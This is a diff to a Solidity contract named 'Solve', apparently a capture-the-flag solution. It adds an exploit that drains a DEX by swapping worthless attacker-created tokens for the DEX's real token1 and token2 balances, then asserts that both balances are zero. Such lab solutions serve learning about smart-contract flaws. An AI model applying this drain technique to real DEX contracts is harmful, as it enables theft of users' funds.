@@ -14,6 +14,16 @@ contract Solve {
         myToken1.transfer(address(dex), 1);
         myToken2.transfer(address(dex), 1);
 
+        myToken1.approve(address(dex), 1);
+        myToken2.approve(address(dex), 1);
+
+        dex.swap(address(myToken1), address(token1), 1);
+        dex.swap(address(myToken2), address(token2), 1);
+
+        require(token1.balanceOf(address(dex)) == 0, "!token1 = 0");
+        require(token2.balanceOf(address(dex)) == 0, "!token2 = 0");
+    }
+}
 
 interface IDex {
     function token1() external view returns (address);
